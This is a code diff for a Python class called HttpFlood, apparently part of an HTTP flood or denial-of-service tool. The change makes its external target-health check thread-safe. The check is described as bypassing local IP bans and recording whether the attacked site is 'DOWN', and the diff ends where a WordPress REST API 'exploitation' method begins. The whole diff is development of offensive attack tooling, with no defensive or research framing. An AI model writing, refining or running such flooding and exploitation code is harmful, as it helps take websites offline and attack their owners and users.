@@ -1866,17 +1866,18 @@ class HttpFlood(Thread):
         Checks target health from EXTERNAL servers every 5 minutes.
         Completely bypasses local IP bans. 1 check/5min = ~12/hr = stays within API limits."""
         intel = self._chaos_intel
-        # [V51.3] Run the health probe early (at execution 2) to get initial status, then every 600s
-        if intel["total_executions"] < 2:
-            return
-        
-        # Check every 10 minutes (600s) to guarantee no rate limits and reduce overhead
+        # Only check every 600s, and ensure only ONE thread does this at a time!
         last_ext_check = intel.get("_last_ext_check_time", 0)
         if time() - last_ext_check < 600:
             return
-        intel["_last_ext_check_time"] = time()
             
+        if intel.get("_health_check_running"):
+            return
+            
+        intel["_health_check_running"] = True
+        
         try:
+            intel["_last_ext_check_time"] = time()
             start = time()
             target_url = f"{self._target.scheme}://{self._target.authority}/"
             domain = self._target.authority.split(':')[0]
@@ -1955,9 +1956,11 @@ class HttpFlood(Thread):
                 intel["ext_health_status"] = "DOWN"
                 intel["health_history"].append(9999)
                 
-        except Exception:
-            # API unreachable (our internet issue) — don't change status
-            pass
+        except Exception as e:
+            # If all else fails, do not leave it in PENDING
+            intel["ext_health_status"] = "ERROR/SKIPPED"
+        finally:
+            intel["_health_check_running"] = False
 
     def _chaos_wp_json_exploitation(self):
         """[V32+] WordPress REST API Endpoint Discovery and Exploitation.
